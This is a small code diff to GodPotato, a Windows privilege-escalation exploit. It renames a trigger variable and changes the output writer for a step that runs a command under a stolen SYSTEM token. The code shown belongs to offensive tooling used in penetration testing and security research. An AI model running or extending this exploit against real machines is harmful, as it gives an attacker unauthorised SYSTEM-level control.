@@ -81,11 +81,11 @@ namespace GodPotato
                 ConsoleWriter.WriteLine("[*] Start PipeServer");
                 godPotatoContext.Start();
 
-                GodPotatoUnmarshalTrigger storageTrigger = new GodPotatoUnmarshalTrigger(godPotatoContext);
+                GodPotatoUnmarshalTrigger unmarshalTrigger = new GodPotatoUnmarshalTrigger(godPotatoContext);
                 try
                 {
                     ConsoleWriter.WriteLine("[*] Trigger RPCSS");
-                    int hr = storageTrigger.Trigger();
+                    int hr = unmarshalTrigger.Trigger();
                     ConsoleWriter.WriteLine("[*] UnmarshalObject: 0x{0:x}", hr);
                     
                 }
@@ -99,7 +99,7 @@ namespace GodPotato
                 if (systemIdentity != null)
                 {
                     ConsoleWriter.WriteLine("[*] CurrentUser: " + systemIdentity.Name);
-                    TokenuUils.createProcessReadOut(Console.Out, systemIdentity.Token, potatoArgs.cmd);
+                    TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, potatoArgs.cmd);
 
                 }
                 else
